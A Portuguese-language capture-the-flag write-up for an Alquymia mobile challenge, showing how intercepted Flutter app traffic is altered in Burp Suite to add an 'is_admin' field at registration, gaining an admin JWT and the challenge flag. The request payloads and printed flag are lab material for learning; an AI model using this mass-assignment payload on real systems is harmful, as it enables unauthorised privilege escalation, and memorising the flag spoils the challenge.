---
layout: post  
title: "TodoApp - Alquymia"  
date:  2025-11-23
categories: [Web, Mobile, Misc]  
tags: [Alquymia, CTF]  
---

## 📋 Descrição do Desafio

A empresa TechCorp contratou você como pentester para avaliar a segurança de seu novo aplicativo mobile de produtividade. O "TodoApp" é um gerenciador de tarefas simples que permite aos funcionários organizarem suas atividades diárias. Sua missão é identificar e explorar possíveis vulnerabilidades que possam comprometer dados ou funcionalidades do sistema.

**Arquivo fornecido:** `todoapp.apk`

---

## 🔍 Reconhecimento Inicial

### Análise do Aplicativo

Ao instalar e executar o `todoapp.apk`, observamos:

- **Telas disponíveis:**
  - Tela de Login
  - Tela de Registro
  - Tela de cadastro de TODOs

- **Tecnologia:** Flutter (dificulta engenharia reversa tradicional)

- **Comunicação:** HTTP (sem HTTPS/SSL Pinning)
  - ✅ Facilita interceptação com proxy
  - ⚠️ Péssima prática de segurança

---

## 🛠️ Passo 1: Configuração do Ambiente

### 1.1 Configurar Burp Suite como Proxy

1. Abra o **Burp Suite**
2. Navegue até `Proxy > Options`
3. Configure o listener:
   - **Bind to address:** `All interfaces`
   - **Porta:** `8080`
4. Anote o IP da sua máquina (ex: `192.168.1.100`)

### 1.2 Configurar o Dispositivo Android

1. Acesse `Configurações > Wi-Fi`
2. Toque e segure na rede conectada
3. Selecione `Modificar Rede`
4. Configure o proxy manualmente:
   - **Host:** `192.168.1.100` (IP da máquina com Burp)
   - **Porta:** `8080`
   

---


## 🕵️ Passo 2: Interceptar o Tráfego

### 2.1 Iniciar Interceptação

1. No Burp Suite: `Proxy > Intercept` → Ative `Intercept is on`
2. Abra o aplicativo TodoApp no dispositivo
3. Navegue até a tela de **Registro**

### 2.2 Capturar Requisição de Registro

1. Preencha o formulário de registro:
   - **Username:** `testuser`
   - **Password:** `Test123!`

2. Clique em **"Registrar"**

3. A requisição será interceptada no Burp:

```http
POST /auth/register HTTP/1.1
Host: mobile-todo.alqlab.com
User-Agent: Dart/3.9 (dart:io)
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate, br
Content-Length: 66
Connection: keep-alive

{
  "username": "testuser",
  "password": "Test123!"
}
```

---

## 💥 Passo 3: Explorar a Vulnerabilidade

### 3.1 Identificar a Falha: Mass Assignment

A vulnerabilidade está no backend que processa o registro. O servidor aceita **qualquer campo JSON** e os inclui no JWT sem validação adequada.

**Vulnerabilidade:** O desenvolvedor não restringiu quais campos podem ser enviados no registro, permitindo que um atacante injete campos sensíveis como `is_admin`.

### 3.2 Modificar a Requisição (Payload Malicioso)

No Burp Suite, modifique o corpo da requisição adicionando o campo `is_admin`:

```json
{
  "username": "hacker123",
  "password": "Senha@Forte456",
  "is_admin": true
}
```

### 3.3 Enviar a Requisição Modificada

1. Clique em **Forward** no Burp para enviar a requisição
2. Observe a resposta do servidor:

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwic3ViIjoiaGFja2VyMTIzIiwiZXhwIjoxNzYzNzY2MzI1fQ.xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxX",
  "token_type": "bearer"
}
```

✅ **Sucesso!** Recebemos um token JWT.

---

## 🔓 Passo 4: Verificar o Token JWT

### 4.1 Decodificar o JWT

Use o site [jwt.io](https://jwt.io) para decodificar o token.

**Token JWT estrutura:**

```
HEADER.PAYLOAD.SIGNATURE
```

**Payload decodificado:**

```json
{
  "is_admin": true,
  "sub": "hacker123",
  "exp": 1763766325
}
```

🎯 **Observe:** O campo `"is_admin": true` está presente no token! Conseguimos escalar privilégios.

---

## 🚩 Passo 5: Capturar a Flag

### 5.1 Requisição para Listar TODOs

Copie o **access_token** recebido e faça a seguinte requisição:

```http
GET /todos/get-all?skip=0&limit=100 HTTP/1.1
Host: mobile-todo.alqlab.com
User-Agent: Dart/3.9 (dart:io)
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwic3ViIjoiaGFja2VyMTIzIiwiZXhwIjoxNzYzNzY2MzI1fQ.xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxX
Connection: keep-alive
```

### 5.2 Resposta com a Flag

```json
[
  {
    "id": 1,
    "title": "Flag do Administrador",
    "description": "ALQ{129d119e12185b876315dbd494c65ffe}",
    "completed": false,
    "user_id": "admin",
    "created_at": "2025-01-15T10:30:00Z"
  }
]
```

🚩 **FLAG:** `ALQ{129d119e12185b876315dbd494c65ffe}`


